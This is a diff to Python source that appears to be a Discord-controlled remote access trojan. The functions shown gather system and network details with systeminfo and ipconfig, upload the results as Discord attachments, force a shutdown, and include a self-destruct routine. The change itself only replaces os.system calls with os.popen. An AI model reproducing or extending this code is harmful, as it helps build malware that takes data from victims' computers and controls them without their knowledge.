@@ -33,13 +33,13 @@ def self_destruct():
   os.popen(f"start {script_file}")
 
 def comp_info():
-  os.system("systeminfo > pc_info.txt")
+  os.popen("systeminfo > pc_info.txt")
   embed = discord.Embed(title="Computer Information",description="Result uploaded.", color=0x00ff00)
   file_out = discord.File("pc_info.txt", filename="pc_info.txt")
   return embed, file_out
 
 def networking_info():
-  os.system("ipconfig /all > networking_info.txt")
+  os.popen("ipconfig /all > networking_info.txt")
 
 def pc_shutdown():
   os.popen("shutdown /s /t 0")
